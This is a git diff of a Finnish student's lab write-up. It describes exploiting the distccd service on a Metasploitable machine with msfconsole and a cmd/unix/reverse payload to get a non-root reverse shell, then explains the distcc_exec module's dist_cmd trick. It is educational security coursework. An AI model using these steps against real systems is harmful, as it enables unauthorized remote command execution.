@@ -26,7 +26,7 @@ Avasin msfconsolen ``sudo msfconsole``, etsin hyökkäyksen ``search distccd`` j
 
 ``show payloads`` katsoin, millaisia payloadeja hyökkäyksessä pystyi käyttämään. Löytämäni ohjeen mukaan valitsin cmd/unix/reverse ``set PAYLOAD 6``, ja sitten ``run``.
 
-Ilmoituksena tuli, että exploit suoritettu, sessiota ei luotu. Katsoin ``show options`` pitäisikö jotain muuta määrittää. Korjasin LHOST ``set LHOST 192.168.56.101``, valitsin saman payloadin ja suoritin exploitin uudelleen. Nyt pääsin sisään, mutten rootina. Päivittämällä session Meterpreter-sessioksi pystyi kuitenkin etenemään, mutta ilman sudo-oikeuksia kaikkialle ei päässyt.
+Ilmoituksena tuli, että exploit suoritettu, sessiota ei luotu. Katsoin ``show options`` pitäisikö jotain muuta määrittää. Korjasin LHOST ``set LHOST 192.168.56.101``, valitsin saman payloadin ja suoritin exploitin uudelleen. Nyt pääsin sisään, mutten rootina. 
 
 ![image](https://github.com/user-attachments/assets/552fe8f1-b26f-4f6b-afc1-3bd457a3b2ca)
 
@@ -35,6 +35,12 @@ Ilmoituksena tuli, että exploit suoritettu, sessiota ei luotu. Katsoin ``show o
 
 
 ## b) Sorsa. Selitä ja arvioi valitsemasi hyökkäyksen toimintaa lähdekoodista.
+
+Lähdekoodin löysin ``/usr/share/metasploit-famework/modules/exploits/unix/misc/distcc_exec.rb``.
+
+[https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html](https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html)
+
+Exploitin kriittinen osa on dist_cmd-kohta, joka huijaa DistCC luulemaan, että komento on käännöskomento. Tässä vaiheessa payload suoritetaan etäkoneella.
 
 ##
 # This module requires Metasploit: https://metasploit.com/download
@@ -194,6 +200,10 @@ end
 
 
 ## Lähteet
+
+https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html
+
+https://dev.to/atenadadkhah/hack-metasploitable-machine-in-5-ways-using-kali-linux-2h9e
 
 
 https://dev.to/atenadadkhah/hack-metasploitable-machine-in-5-ways-using-kali-linux-2h9e
